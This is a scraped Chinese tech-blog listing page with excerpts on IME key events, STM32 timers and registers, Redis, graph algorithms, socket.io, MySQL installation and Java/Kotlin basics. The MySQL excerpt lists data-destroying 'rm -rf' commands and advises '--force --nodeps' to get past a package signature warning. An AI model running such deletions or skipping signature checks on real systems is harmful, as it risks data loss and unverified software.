比如你不希望在聊天框输入法一回车就将消息发送了。
有两种方案。
event.isComposing 容易想到的是使用 keydown。
keydown 在使用输入法的情况下回车也是会被触发的（MacOS 会，Window 没测试过，貌似不会）。
触发是触发了，但我们可以通过 event 对象的 isComposing 属性判断是否在使用输入法。
handleKeydown={(e) =&gt; { if (e.key === 'Enter' &amp;&amp; !e.isComposing) { e.currentTarget.blur(); } }} 另外，浏览器是支持输入法事件的：
compositionstart 表示 开始 使用输入法输入内容；compositionupdate 表示 正在使用 输入法输入内容；compositionend 表示使用输入法 输入完毕。 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NuDFPuPb-1674532055033)(https://fe-watermelon.oss-cn-shenzhen.aliyuncs.com/%E8%BE%93%E5%85%A5%E6%B3%95%E4%BA%8B%E4%BB%B6.gif)]
keypress keypress 已经是废弃状态，但主流浏览器为了兼容旧代码还是会支持的，当然不推荐就是了。话说很多废弃的特性我们有时候还是会用的，毕竟浏览器也不敢真移除掉。
keypress 和 keydown 非常类似，区别是 keydown 按下任何键都会触发，而 keypress 只会在按下字符键时触发。简单来说，就是会产生修改文本内容的字符就会触发，比如 a、1 这些，像 shift 就不会触发，不过 Enter 会触发，因为是键入一个 “回车符”。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49bc54ffad957f9f81eb62c440a1822b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07783791c7fb84acc7f76f4353325d62/" rel="bookmark">
			【STM32】STM32CubeMX使用FreeRTOS教程1----定时器学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【STM32】STM32CubeMX使用FreeRTOS教程1----定时器学习 前言 本教程将对应外设原理，HAL库、STM32CubeMX和FreeRTOS结合在一起讲解，分析学习过程中遇到的问题和一些注意事项。
知识概括： SMT32定时器原理
STM32CubeMX创建定时器例程
HAL库TIM定时器函数库
定时器中断的创建与使用
FreeRTOS中断级临界代码段理解
定时器简介 SMT32F1系列共有8个定时器：
高级定时器（TIM1、TIM8）；通用定时器（TIM2、TIM3、TIM4、TIM5）；基本定时器（TIM6、TIM7）。
SMT32F4系列共有15个定时器：
高级定时器（TIM1、TIM8）；通用定时器（TIM2、TIM3、TIM4、TIM5、TIM9~TIM14）；基本定时器（TIM6、TIM7）。
基本定时器功能（TIM6、TIM7）： 1. 16位向上、向下、向上/下自动装载计数器
2. 16位可编程(可以实时修改)预分频器，计数器时钟频率的分频系数为1～65535之间的任意数值
3. 触发DAC的同步电路 注:此项是TIM6/7独有功能.
4. 位于APB1总线上**
通用定时器(TIM2~TIM5)的主要功能: 16位向上、向下、向上/下自动装载计数器
16位可编程(可以实时修改)预分频器，计数器时钟频率的分频系数为1～65535之间的任意数值
4 个独立通道（TIMx_CH1~4）可以用作：
测量输入信号的脉冲长度( 输入捕获)
输出比较
单脉冲模式输出
PWM输出(边缘或中间对齐模式)
支持针对定位的增量(正交)编码器和霍尔传感器电路
如下事件发生时产生中断/DMA：
更新：计数器向上溢出/向下溢出，计数器初始化(通过软件或者内部/外部触发)
触发事件(计数器启动、停止、初始化或者由内部/外部触发计数)
输入捕获
输出比较
位于APB1总线上
CubeMX创建freertos工程 CubeMX工程中我选的芯片为STM32F103C8T6
1、设置RCC 设置高速外部时钟HSE 选择外部时钟源
2、设置时钟 选择外部时钟为8MHz，在HCLK中直接输入72,CubeMX会自动配置好。
设置时钟后，需要选择系统时钟来源，当使用了FreeRtos的时候，强烈建议HAL库使用除了Systick以外的时钟源。也就是说当不使用FreeRtos的时候，HAL使用的是systick作为时钟源，现在使用了rtos，不建议hal库和rtos一起使用systick作为时钟源。在这里我选择了TIM1作为HAL库时钟。
3、设置定时器 定时器选择内部时钟
Prtscaler (定时器分频系数) : 7199
Counter Mode(计数模式) Up(向上计数模式)
Counter Period(自动重装载值) : 4999
CKD(时钟分频因子) ： No Division 不分频
auto-reload-preload(自动重装载) : Enable 使能
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07783791c7fb84acc7f76f4353325d62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5317a41bff7f9bb9d1614e4cb993fdab/" rel="bookmark">
			【STM32】寄存器原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果我们想要深入去学习STM32单片机的存储原理和方式，就要花时间去了解STM32单片机有关寄存器的基本原理
单片机型号：正点原子STM32F103ZET6
目录
寄存器的定义
寄存器分类
存储器映射
寄存器映射
通过地址访问控制单元运作
通过定义宏来取代直接访问绝对地址的控制方式
寄存器说明的使用
利用C语言对地址进行封装
寄存器的定义 寄存器功能是存储二进制代码，由具有存储功能和触发器组成的。寄存器是CPU内部一块小型存放数据的区域，用来暂存运算的数据结果。它拥有很高的数据传递速度。寄存器也是存储器的一种。
下图为寄存器常在位置。
寄存器分类 控制寄存器(xxx_CR)：用来控制，配置中某些部件的工作方式；
状态寄存器(xxx_SR)：存储了当前外设的工作状态；
数据寄存器(xxx-DR)：存储外设进行输入输出数据；
存储器映射 1.存储：首先存储型外设FSMC,RAM,FLASH以及AHB桥到APB桥上的外设都存储于一块4GB大的空间内部,我们给这块空间分好大小并编上地址(类似于我们通过门牌号来找到家，我们可以通过地址调用不同存储单元)
2.存储器映射：存储器本身不具有地址信息，它的地址是由芯片厂商或用户配，给存储器分配地址的过程就称为存储器映射(类似于给新建的房子编上门牌号)。且如果给存储器再分配一个地址就叫存储器重映射。
（上图为存储器映射图）
3.功能划分：在这 4GB 的地址空间中，ARM 已经粗线条的平均分成了 8 个块，每块 512MB，每个块也都规定了用途。而芯片厂商在每个块的范围内设计各具特色的外设时并不一定都用得完，都是只用了其中的一部分而已。
(上图为存储器功能区域划分)
Block0:此块为Flash的存放区域，一般ST公司只使用512KB
Block1:此块为SRAM的存放区域，一般ST公司仅用了64KB
Block2:此处为外接的一大串外设的存储区域
Block3-Block4:此处是FSMC的存储区域
Block5:此区域是FSMC寄存器的区域
Block6:此处为无使用区
Block7:此处为芯片内核里面的寄存器存储的位置
寄存器映射 在存储器 Block2 这块区域，设计的是片上外设，它们以四个字节为一个单元，共32bit，每一个单元对应不同的功能，当我们控制这些单元时就可以驱动外设工作。我们可以找到每个单元的起始地址，然后通过 C 语言指针的操作方式来访问这些单元，如果每次都是通过这种地址的方式来访问，不仅不好记忆还容易出错，这时我们可以根据每个单元功能的不同，以功能为名给这个内存单元取一个别名，这个别名就是我们经常说的寄存器，这个给已经分配好地址的有特定功能的内存单元取别名的过程就叫寄存器映射。
通过地址访问控制单元运作 如将GPIOB 16个IO口都输出高电平：
方法一：由地址来找到对应单元并且进行操作
方法二：通过访问寄存器别名来找到相应单元进行操作
通过定义宏来取代直接访问绝对地址的控制方式 在外设的内存块中由下到上挂着ABP1,ABP2,AHB三条总线，每条总线都外连一些外设，我们将从总线APB1为初始设置地址。相应总线的最低地址我们称为该总线的基地址，总线基地址也是挂载在该总线上的首个外设的地址。
其中 APB1 总线的地址最低，片上外设从这里开始，也叫总线外设基地址。如下图为GPIOx的外设基地址。外设基地址相对于总线及地址的距离就是相对总线的地址偏移。
而在某一个外设的地址范围内就分布着这个外设的寄存器。以GPIO为例，每个GPIO寄存器都以4个字节为单位划分。而外设寄存器位置都可以用寄存器外设基地址偏移来表示。下图以GPIOB端口为例：
通过上面我们就可以定义宏来替代寄存器绝对地址，而且有了偏移的数值，就可以更加简便由外设/总线基地址来找到每一个寄存器地址。
寄存器说明的使用 以GPIO端口设置\清除寄存器说明为例
寄存器说明中首先列出了该寄存器中的名称，“(GPIOx_BSSR)(x=A…E)”这段的意 思是该寄存器名为“GPIOx_BSSR”其中的“x”可以为 A-E，也就是说这个寄存器说明适 用于 GPIOA、GPIOB 至 GPIOE，这些 GPIO 端口都有这样的一个寄存器。偏移地址是指本寄存器相对于这个外设的基地址的偏移。3是寄存器的位表，表中列出它的 0-31 位的名称及权限。表上方的数字为位、编号，中间为位名称，最下方为读写权限，其中w表示只写，r表示只读，r/w表示可读写。本寄存器中的位权限都是 w，所以只能写，如果读本寄存器，是无法保证读取到它真正内容的。而有的寄存器位只读，一般是用于表示 STM32 外设的某种工作状态的，由 STM32 硬件自动更改，程序通过读取那些寄存器位来判断外设的工作状态。位功能是寄存器说明中最重要的部分，它详细介绍了寄存器每一个位的功能。例如本寄存器中有两种寄存器位，分别为 BRy 及 BSy，其中的 y 数值可以是 0-15，这里的 0-15 表示端口的引脚号，如 BR0、BS0 用于控制 GPIOx 的第 0 个引脚，若 x 表示 GPIOA，那就是 控制 GPIOA 的第 0 引脚，而 BR1、BS1 就是控制 GPIOA 第 1 个引脚。 其中 BRy 引脚的说明是“0：不会对相应的 ODRx 位执行任何操作；1：对相应 ODRx 位进行复位”。这里的“复位”是将该位设置为 0 的意思，而“置位”表示将该位设置为 1；说明中的 ODRx 是另一个寄存器的寄存器位，我们只需要知道 ODRx 位为1 的时候，对应的引脚 x 输出高电平，为 0 的时候对应的引脚输出低电平即可。所以，如果对 BR0 写入“1”的话，那么 GPIOx 的第0个引脚就会输出“低电平”，但是对 BR0 写入“0”的话，却不会影响 ODR0 位，所以引 脚电平不会改变。要想该引脚输出“高电平”，就需要对“BS0”位写入“1”，寄存器位BSy 与 BRy 是相反的操作。 利用C语言对地址进行封装 为方便于记忆，我们将总线基地址和外设基地址和寄存器基地址进行宏定义，便于我们通过偏移值准确找到寄存器位置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5317a41bff7f9bb9d1614e4cb993fdab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89d3d7b29c644e7a7edd17816064784f/" rel="bookmark">
			Java面试系列-Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8.3 Redis 什么是Redis，为什么用Redis？ Redis是一种支持key-value等多种数据结构的存储系统。可用于缓存，事件发布或订阅，高速队列等场景。支持网络，提供字符串，哈希，列表，队列，集合结构直接存取，基于内存，可持久化。
读写性能优异
Redis能读的速度是110000次/s,写的速度是81000次/s （测试条件见下一节）。
数据类型丰富
Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。
原子性
Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。
丰富的特性
Redis支持 publish/subscribe, 通知, key 过期等特性。
持久化
Redis支持RDB, AOF等持久化方式
发布订阅
Redis支持发布/订阅模式
分布式
Redis Cluster
为什么Redis 是单线程的以及为什么这么快？ redis完全基于内存,绝大部分请求是纯粹的内存操作,非常快速.
数据结构简单,对数据操作也简单,redis中的数据结构是专门进行设计的
采用单线程模型, 避免了不必要的上下文切换和竞争条件, 也不存在多线程或者多线程切换而消耗CPU, 不用考虑各种锁的问题, 不存在加锁, 释放锁的操作, 没有因为可能出现死锁而导致性能消耗
使用了多路IO复用模型,非阻塞IO
使用底层模型不同,它们之间底层实现方式及与客户端之间的 通信的应用协议不一样,Redis直接构建了自己的VM机制,因为一般的系统调用系统函数的话,会浪费一定的时间去移动和请求
Redis 一般有哪些使用场景？ 可以结合自己的项目讲讲，比如
热点数据的缓存
缓存是Redis最常见的应用场景，之所有这么使用，主要是因为Redis读写性能优异。而且逐渐有取代memcached，成为首选服务端缓存的组件。而且，Redis内部是支持事务的，在使用时候能有效保证数据的一致性。
限时业务的运用
redis中可以使用expire命令设置一个键的生存时间，到时间后redis会删除它。利用这一特性可以运用在限时的优惠活动信息、手机验证码等业务场景。
计数器相关问题
redis由于incrby命令可以实现原子性的递增，所以可以运用于高并发的秒杀活动、分布式序列号的生成、具体业务还体现在比如限制一个手机号发多少条短信、一个接口一分钟限制多少请求、一个接口一天限制调用多少次等等。
分布式锁
这个主要利用redis的setnx命令进行，setnx："set if not exists"就是如果不存在则成功设置缓存同时返回1，否则返回0 ，这个特性在俞你奔远方的后台中有所运用，因为我们服务器是集群的，定时任务可能在两台机器上都会运行，所以在定时任务中首先 通过setnx设置一个lock，如果成功设置则执行，如果没有成功设置，则表明该定时任务已执行。 当然结合具体业务，我们可以给这个lock加一个过期时间，比如说30分钟执行一次的定时任务，那么这个过期时间设置为小于30分钟的一个时间就可以，这个与定时任务的周期以及定时任务执行消耗时间相关。
在分布式锁的场景中，主要用在比如秒杀系统等。
Redis 有哪些数据类型？ 5种基础数据类型，分别是：String、List、Set、Zset、Hash。
结构类型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89d3d7b29c644e7a7edd17816064784f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f53fc14ca3c07054ee3acd4cacecd32c/" rel="bookmark">
			基于哈夫曼树的英文文本数据压缩算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于哈夫曼树的英文文本数据压缩算法 （1）问题描述
输入一串字符串，根据给定的字符串中字符出现的频率建立相应的哈夫曼树，构造哈夫曼编码表，在此基础上可以对压缩文件进行压缩（即编码），同时可以对压缩后的二进制编码文件进行解压（即译码）。
（2）输入要求
多组数据，每组数据1行，为一个字符串（只考虑26个小写字母即可）。当输入字符串为“0”时，输入结束。
（3）输出要求
每组数据输出2n+3行（n为输入串中字符类别的个数。第1行为统计出来的字符出现频率（只输出存在的字符，格式为：字符：频度），每两组字符之间用一个空格分隔，字符按照 ASCII 码从小到大的顺序排列。第2行至第2n行为哈夫曼树的存储结构的终态，如主教材139页表5.2（b）,一行当中的数据用空格分隔。第2n+1行为每个字符的哈夫曼编码（只输出存在的字符，格式为：
字符：编码），每两组字符之间用一个空格分隔，字符按照ASCII码从小到大的顺序排列。第2n+2行为编码后的字符串，第2n+3行为解码后的字符串（与输入的字符串相同）。
（4）输入样式
aaaaaaabbbbbccdddd (案例1)
aabccc (案例2)
0
（5）输出样例
a:7 b:5 c:2 d:4 (案例1)
1 7 7 0 0
2 5 6 0 0
3 2 5 0 0
4 4 5 0 0
5 6 6 3 4
6 11 7 2 5
7 18 0 1 6
a:0 b:10 c:110 d:111 00000001010101010110110111111111111
aaaaaaabbbbbccdddd a:2 b:l c:3 (案例2)
1 2 4 0 0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f53fc14ca3c07054ee3acd4cacecd32c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/341d2feec43f2cffa6f999b1a8b6f904/" rel="bookmark">
			基于Dijsktra算法的最短路径求解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Dijsktra算法的最短路径求解 1.问题描述:
一张地图包括n个城市，假设城市间有m条路径(有向图)，每条路径的长度已知。给定地图的一个起点城市和终点城市，利用Dijsktra算法求出起点到终点之间的最短路径。
2.输入要求:
多组数据，每组数据有m+3行。第一行为两个整数n和m,分别代表城市个数n和路径条数m。第二行有n个字符，代表每个城市的名字。第三行到第m+2行每行有两个字符a和b和一个 整数d,代表从城市a到城市b有一条距离为d的路。最后一行为两个字符，代表待求最短路径的城市起点和终点。当n和m都等于0时，输入结束。
3.输出要求:
每组数据输出2行。第1行为一个整数，为从起点到终点之间最短路的长度。第2行为一串字符串，代表该路径。每两个字符之间用空格隔开。
实现代码如下(含有部分代码注释解释):
#include &lt;iostream&gt; #include&lt;string&gt; using namespace std; //____图的邻接矩阵存储表示____ #define MaxInt 32567 //表示极大值，即正无穷 #define MVNum 100 //最大定点数 #define OK 1 typedef char VerTexType;//假设顶点的数据类型为字符型 vertex顶点 typedef int ArcType;//假设边的权值类型为整型 typedef struct { VerTexType vexs[MVNum];//顶点表 ArcType arcs[MVNum][MVNum];//邻接矩阵（其中arcs[v1][v2]的值应当于arcs[v2][v1]相等，在矩阵中呈对称形式，但是对应的是同一个边，所以权值相同) int vexnum, arcnum;//图的当前点数和边数 }AMGraph; VerTexType IndexVex(AMGraph G, int u) {//存在则返回u在顶点表中的下标，否则返回-1 return G.vexs[u]; } int LocateVex(AMGraph G, VerTexType v) { for (int i = 0; i &lt; G.vexnum; i++) { if (v == G.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/341d2feec43f2cffa6f999b1a8b6f904/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/632ccb6f2a7b5942796860d78fbb5795/" rel="bookmark">
			socket.io的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 npm install socket.io # 写这篇文档时: "socket.io": "^4.5.4" 快捷使用 备注：通过快捷使用的例子，就可以走通websocket的流程了。
node服务器端：
import * as express from "express"; import { createServer } from "http"; import { Server } from "socket.io"; const app = express(); const httpServer = createServer(app); const io = new Server(httpServer, { cors: { /* 允许 http://127.0.0.1:5500 可以跨域访问该socket, 不写的话本地调试报跨域 数组可以写多个可以跨域的地址 */ origin: ['http://127.0.0.1:5500'] } }); io.on("connection", (socket) =&gt; { console.log("连接成功了，连接的信息:", socket) }); httpServer.listen(12306); 注意跨域的配置,官方文档： https://socket.io/zh-CN/docs/v4/handling-cors/ 前端:
&lt;!DOCTYPE html&gt; &lt;html lang="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/632ccb6f2a7b5942796860d78fbb5795/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da8066bb7c6769bdfc2d1711f56c08ea/" rel="bookmark">
			Centos7离线安装mysql5.7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装前先卸载旧版本的mysql 通过rpm –qa |grep mysql查询已经安装过的mysql软件
使用rpm –e 包名 的命令来删除相关的包
同时手动删除（有则删除）一些配置信息，
rm -f /etc/my.cnf
rm -rf /var/lib/mysql
rm -rf /var/share/mysql
rm -rf /usr/bin/mysql*
2. 安装mysql 首先得拿到安装包，到官网下载，找到相应系统版本的服务端和客户端安装包，注意架构，目前都是选用x86架构的64位软件。
https://dev.mysql.com/downloads/mysql/
下载之后的包是一个tar包
要安装首先得把解出到一个目录
使用tar –xvf 包名 –C 目录名
这个包里边除了服务端和客户端外，还有一些依赖库以及拓展包，我们只要安装服务端和客户端即可。不过安装这些包都有依赖关系，再没有安装依赖包之前安装软件会报错，所以一般都是以下顺序安装：
sudo rpm -ivh mysql-community-common-5.7.20-1.el7.x86_64.rpm
sudo rpm -ivh mysql-community-libs-5.7.20-1.el7.x86_64.rpm
sudo rpm -ivh mysql-community-client-5.7.20-1.el7.x86_64.rpm
sudo rpm -ivh mysql-community-server-5.7.20-1.el7.x86_64.rpm
sudo rpm -ivh mysql-community-devel-5.7.20-1.el7.x86_64.rpm
如果安装爆错
rpm安装MySQL时爆出警告：
警告：MySQL-server-5.5.46-1.linux2.6.x86_64.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY
原因：这是由于yum安装了旧版本的GPG keys造成的
解决办法：后面加上 --force --nodeps
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da8066bb7c6769bdfc2d1711f56c08ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d0111f72c1085207e1eb3c34038907f/" rel="bookmark">
			Tarjan算法详解（AcWing 1174 受欢迎的牛）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述：
每一头牛的愿望就是变成一头最受欢迎的牛。
现在有 N 头牛，编号从 1 到 N，给你 M 对整数 (A,B)，表示牛 A 认为牛 B 受欢迎。
这种关系是具有传递性的，如果 A 认为 B 受欢迎，B 认为 C 受欢迎，那么牛 A 也认为牛 C 受欢迎。
你的任务是求出有多少头牛被除自己之外的所有牛认为是受欢迎的。
输入格式
第一行两个数 N,M；
接下来 M 行，每行两个数 A,B，意思是 A 认为 B 是受欢迎的（给出的信息有可能重复，即有可能出现多个 A,B）。
输出格式
输出被除自己之外的所有牛认为是受欢迎的牛的数量。
数据范围
1≤N≤104,
1≤M≤5×104
输入样例：
3 3
1 2
2 1
2 3
输出样例：
1
样例解释
只有第三头牛被除自己之外的所有牛认为是受欢迎的。
分析：
本题考察tarjan算法，又是一个精彩的图论算法。下面会分两部分展开论述，第一部分主要讲解一下 tarjan算法及其在求有向图的强连通分量上的应用，第二部分主要分析如何用tarjan算法去求解本题。
1、Tarjan算法 几个概念 DAG：有向无环图连通分量：简单地说就是一组顶点中每个顶点都可以到达其他的顶点强连通分量：极大的连通分量 上面的定义或许不够严谨，但是基本可以概括这些词的含义。或者说，有向图的强连通分量既要求顶点间的连通性，有要求顶点的极大性，即再增加任意一个节点都会使得原连通分量不再连通。
遍历图时点的状态 在之前写的数据结构专栏的图论那章，详细说过图的遍历中节点的状态以及边的分类，这里还是要简单的概述下这些概念。
在对一个图做遍历时，不论是BFS还是DFS，节点在遍历的不同节点被划分成了不同的状态。
undiscovered：节点还未被访问到discovered：节点已经被访问到，但其相邻的节点还没有访问完visited：节点及其相邻的节点均已被访问完 如果用伪码形容遍历过程中节点的状态就是
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d0111f72c1085207e1eb3c34038907f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/879b682d55d91741659f4a4c107b3ca1/" rel="bookmark">
			（图解）循环队列的三种判断队空、队满操作（附带源码和插入删除操作等一些基本操作）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、普通的顺序存储队列
二、循环队列
（1）少用一个元素空间
i、初始化队列操作：
iii、入队操作：
iv、出队操作：
（2）设置flag标志
i、初始化队列操作：
ii、判断队空操作：
iii、入队操作：
iv、出队操作：
（3）设置length存储队列元素的个数
i、初始化队列操作：
ii、判断队空操作：
iii、入队操作：
iv、出队操作：
（4） 总结
三、循环队列测试程序
（1）少用一个元素空间
（2）设置flag标志
（3）设置length存储队列元素的个数
四、拓展
（1）思路
（2）修改代码
队空和队满条件没有改变。
i、初始化操作：
ii、判断队列为空操作：
iii、入队操作：
iv、出队操作：
（3）测试程序
一、普通的顺序存储队列 在介绍循环队列三种判断队空、队满操作之前，先解释下为啥会用循环队列。
队列：一种先进先出（First In First Out）的线性表，简称FIFO。允许插入的一段称为队尾，允许删除的一段称为队头。
咱们看一下普通的顺序存储队列：
普通的顺序储存队列的存储结构为：
#define MAXSIZE 5 typedef int DataType; typedef struct Queue { DataType data[MAXSIZE]; // 存储队列的数据空间 int front; // 队头指针 int rear; // 队尾指针 }SeqQueue; 如图所示：
front、rear分别指向队头，也就是数组索引为0的地方，此时队列为空（即rear == front）， 现在将0、1、2、3、4依次入队（队尾指针rear一直向后移，队头指针front不动）。
如图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/879b682d55d91741659f4a4c107b3ca1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/183cfcdc29a225bb260989fbda7b82d5/" rel="bookmark">
			【Kotlin】泛型 ① ( 泛型类 | 泛型参数 | 泛型函数 | 多泛型参数 | 泛型类型约束 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、泛型类二、泛型参数三、泛型函数四、多泛型参数五、泛型类型约束 一、泛型类 定义一个 泛型类 ,
将 泛型参数 T 放在 尖括号 &lt;T&gt; 中 , 该泛型参数放在 类名后 , 主构造函数之前 , 该泛型参数 T 是 类型占位符 ,
在 该泛型类类中 可以使用 类型占位符 T 作为一个类 使用 ,
可以 定义 T 类型成员属性主构造函数中可以接收 T 类型的实例对象作为参数 ,T 类型可以 作为函数的返回值 ; 通常情况下 , 泛型参数 都使用 T 表示 , 使用其它字母 或者 字符串 都可以表示 泛型参数 , 但是 约定俗成 都使用 T 来表示泛型 ;
代码示例 : 下面的代码中 , 声明了 Student 泛型类 , 该泛型类 接收 T 类型的泛型参数 , 在主构造函数中接收 T 类型的参数 , 在该泛型类中声明了 T 类型的成员属性 ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/183cfcdc29a225bb260989fbda7b82d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/078dcf1aba787cfde5f49d3194c017a1/" rel="bookmark">
			【娱乐大闯关】Java实现学生管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Student.java类二、User_Student.java类三、Main_Student（一）初始界面（二）注册功能用户名格式验证用户名存在性验证身份证号码验证电话号码验证 （三）登录功能生成随机验证码验证用户名和密码 （四）忘记密码查询用户对象下标 （五）Main_student.java示例代码 四、Fun_student.java（一）系统主界面（二）添加学生信息功能学号存在性判断 （三）删除学生信息功能（四）修改学生信息功能（五）查看所有学生信息功能（六）Fun_student.java示例代码 本版本为初级状态，适合初学Java者查看！
需求
该系统主要功能如下： 添加学生：通过键盘录入学生信息，添加到集合中
删除学生：通过键盘录入要删除学生的学号，将该学生对象从集合中删除
修改学生：通过键盘录入要修改学生的学号，将该学生对象其他信息进行修改 查看学生：将集合中的学生对象信息进行展示 退出系统：结束程序
一、Student.java类 定义学生类，包含以下成员变量：学号、姓名、年龄、家庭地址
package com.burial.project; public class Student { //成员变量 private String id;//学号 private String name;//姓名 private int age;//年龄 private String address;//家庭地址 //无参与全参方法 public Student() { } public Student(String id, String name, int age, String address) { this.id = id; this.name = name; this.age = age; this.address = address; } //get和set方法 public String getId() { return id; } public void setId(String id) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/078dcf1aba787cfde5f49d3194c017a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d252145f0bb04a3bf879cbc7107575ec/" rel="bookmark">
			Java刷算法之基于模拟队列的BFS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于模拟队列的BFS 板子题目1----走迷宫样例完整代码 题目2----机器人的运动范围样例完整代码 题目3----海上救援任务样例完整代码 板子 首先将BFS板子拿出来，通过数组构造模拟队列，实现宽度优先搜索(BFS)。宽度优先搜索适用范围：问题要求最短路径。例如：求从左上角走到右下角最少需要走多少步。常见BFS题型：迷宫问题。
public static int BFS(){ int hh=0,tt=0; q[0]=new Pair(0, 0);//将初始点加入队列 for(int[] item:d)Arrays.fill(item,-1);//将距离数组初始化 d[0][0]=0;//将距离矩阵开头初始化为0 int []dx={-1,0,1,0},dy={0,1,0,-1};//方向数组 //当模拟队列不为空 while(hh&lt;=tt){ Pair head=q[hh++];//取出队头 for(int i=0;i&lt;4;i++){ int x=head.x+dx[i],y=head.y+dy[i]; if(x&gt;=0&amp;&amp;x&lt;n&amp;&amp;y&gt;=0&amp;&amp;y&lt;m&amp;&amp;a[x][y]==0&amp;&amp;d[x][y]==-1){ d[x][y]=d[head.x][head.y]+1; q[++tt]=new Pair(x, y);//添加入队列 } } } return d[n-1][m-1]; } 题目1----走迷宫 给定一个 n×m 的二维整数数组，用来表示一个迷宫，数组中只包含 0 或 1，其中 0 表示可以走的路，1 表示不可通过的墙壁。最初，有一个人位于左上角 (1,1) 处，已知该人每次可以向上、下、左、右任意一个方向移动一个位置。请问，该人从左上角移动至右下角 (n,m) 处，至少需要移动多少次。数据保证 (1,1) 处和 (n,m) 处的数字为 0，且一定至少存在一条通路。
输入格式
第一行包含两个整数 n 和 m。
接下来 n 行，每行包含 m 个整数（0 或 1），表示完整的二维数组迷宫。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d252145f0bb04a3bf879cbc7107575ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4e7e44af1bac7e224f0368f57e256ad/" rel="bookmark">
			Java千问：关于Java类的构造方法，看这一篇就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Java语言中，类的构造方法是一种很特殊的方法。关于构造方法要记忆和理解的知识点其实挺多的，下面我们就来详细的讲讲构造方法，相信看过这篇文章之后，你会对构造方法有一个比较深刻的认识和理解。(预警：此文较长，请耐心看完！)
首先来说说构造方法的五个特点：
一、构造方法的名称必须与类的名称相同。比如类的名称叫A，那么它的构造方法必须也叫A。
二、构造方法的前面不能声明返回值类型，即便是void也不行。只有满足了这两个条件，编译器才会认定这个方法是构造方法。
三、如果程序员没有在类中定义构造方法，那么在编译阶段，编译器会“免费赠送”给这个类一个构造方法，也就是说，编译器会在编译阶段在字节码文件中补充添加一个构造方法。但如果程序员已经在类中已经定义了自己的构造方法，则编译器不会再为类添加构造方法。
四、编译器为类“免费赠送”的这个构造方法是一个没有参数的构造方法。至于说这个构造方法里面有什么内容，咱们一会儿再说。
五、编译器“免费赠送”的构造方法与类的修饰符相同，也就是说，如果类本身的访问修饰符是public，那么这个编译器“免费赠送”的构造方法的前面也会自动加上public关键字，同理，如果类的前面没有访问修饰符，那么这个构造方法前面也不会有任何任何访问修饰符。
